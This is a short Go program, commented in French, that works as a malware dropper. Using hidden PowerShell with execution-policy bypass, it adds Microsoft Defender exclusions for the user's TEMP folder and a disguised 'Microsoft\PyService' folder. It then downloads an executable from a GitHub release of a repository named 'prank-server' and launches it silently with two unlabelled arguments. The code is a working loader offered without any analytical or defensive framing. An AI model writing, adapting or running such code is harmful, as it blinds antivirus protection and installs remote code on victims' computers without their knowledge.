package main

import (
	"flag"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

const svcURL = "https://github.com/lamziiii/prank-server/releases/latest/download/svc.exe"

func main() {
	w := flag.String("w", "", "")
	t := flag.String("t", "", "")
	flag.Parse()
	if *w == "" || *t == "" {
		os.Exit(1)
	}

	// Recupere le dossier TEMP utilisateur (stable meme quand eleve en admin)
	userTemp := userTempDir()
	appdata := os.Getenv("LOCALAPPDATA")
	pyDir := filepath.Join(appdata, "Microsoft", "PyService")

	// Exclusions Defender (on est deja admin via le manifest)
	ps := fmt.Sprintf(
		`Add-MpPreference -ExclusionPath '%s' -EA 0; Add-MpPreference -ExclusionPath '%s' -EA 0`,
		userTemp, pyDir,
	)
	exec.Command("powershell", "-ep", "bypass", "-windowstyle", "hidden", "-command", ps).Run()

	// Telechargement de svc.exe dans le dossier exclus
	exe := filepath.Join(userTemp, "svc.exe")
	exec.Command("curl.exe", "-sLo", exe, svcURL).Run()

	// Lancement silencieux
	cmd := exec.Command(exe, "-w", *w, "-t", *t)
	cmd.Start()
}

func userTempDir() string {
	out, err := exec.Command("powershell", "-command",
		"[Environment]::GetEnvironmentVariable('TEMP','User')").Output()
	if err == nil {
		if s := strings.TrimSpace(string(out)); s != "" {
			return s
		}
	}
	return os.TempDir()
}
